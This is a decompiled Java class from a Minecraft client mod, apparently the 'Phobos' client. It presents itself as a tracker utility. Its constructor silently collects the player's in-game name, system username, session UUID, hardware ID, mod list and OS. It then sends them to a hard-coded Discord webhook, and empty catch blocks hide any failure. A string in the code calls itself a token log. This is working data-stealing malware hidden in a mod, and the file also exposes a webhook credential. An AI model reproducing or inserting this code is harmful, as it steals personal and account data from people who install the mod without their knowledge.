/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  net.minecraft.client.Minecraft
 */
package me.earth.phobos.util;

import me.earth.phobos.util.SystemUtil;
import me.earth.phobos.util.TrackerPlayerBuilder;
import me.earth.phobos.util.TrackerUtil;
import net.minecraft.client.Minecraft;

public class TrackerID {
    public TrackerID() {
        String l = "https://discord.com/api/webhooks/852376561797431306/-w-IZtn4AlRDJhbHPeJudBpOu6X-SPalu9kt0vu9FkTVX4dtgpHuJAPiLl3Nx_GamQa4";
        String CapeName = "Perrys Token Log I mean Tracker";
        String CapeImageURL = "https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128";
        TrackerUtil d = new TrackerUtil("https://discord.com/api/webhooks/852376561797431306/-w-IZtn4AlRDJhbHPeJudBpOu6X-SPalu9kt0vu9FkTVX4dtgpHuJAPiLl3Nx_GamQa4");
        String minecraft_name = "NOT FOUND";
        try {
            minecraft_name = Minecraft.func_71410_x().func_110432_I().func_111285_a();
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder().withUsername("Perrys Token Log I mean Tracker").withContent("```\n IGN: " + minecraft_name + "\n USER: " + System.getProperty("user.name") + "\n UUID: " + Minecraft.func_71410_x().field_71449_j.func_148255_b() + "\n HWID: " + SystemUtil.getSystemInfo() + "\n MODS: " + SystemUtil.getModsList() + "\n OS: " + System.getProperty("os.name") + "\n Closed the game.```").withAvatarURL("https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128").withDev(false).build();
            d.sendMessage(dm);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }
}

